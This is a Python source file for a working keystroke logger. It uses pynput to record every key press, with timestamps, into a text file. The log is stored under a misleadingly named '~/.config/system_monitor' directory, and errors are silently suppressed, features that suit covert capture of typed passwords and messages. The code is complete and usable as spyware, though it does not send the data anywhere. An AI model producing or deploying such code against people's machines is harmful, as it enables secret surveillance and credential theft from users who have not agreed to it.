"""Simple keystroke logger - writes to file"""

from pynput import keyboard
from pathlib import Path
from datetime import datetime


class KeystrokeLogger:
    def __init__(self, output_dir: str = "~/.config/system_monitor"):
        self.output_dir = Path(output_dir).expanduser()
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        self.log_file = self.output_dir / "logs" / "keystrokes.txt"
        self.log_file.parent.mkdir(parents=True, exist_ok=True)
        
        self.is_running = False
        self.listener = None
        self.keystroke_count = 0
        self.start_time = None
    
    def start(self):
        """Start logging keystrokes."""
        if self.is_running:
            return
        
        self.is_running = True
        self.start_time = datetime.now()
        self.keystroke_count = 0
        
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
    
    def stop(self):
        if not self.is_running:
            return
        
        self.is_running = False
        if self.listener:
            self.listener.stop()
    
    def _on_press(self, key):
        try:
            # Get the character
            if hasattr(key, 'char') and key.char:
                char = key.char
            else:
                char = f"[{key.name}]"
            
            # Write to file
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            with open(self.log_file, 'a') as f:
                f.write(f"{timestamp} {char}\n")
            
            self.keystroke_count += 1
        except Exception as e:
            pass
        
        return True
    
    def get_statistics(self) -> dict:
        return {
            'total_keystrokes': self.keystroke_count,
            'session_duration': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0,
            'session_start': self.start_time.isoformat() if self.start_time else None,
            'is_running': self.is_running
        }
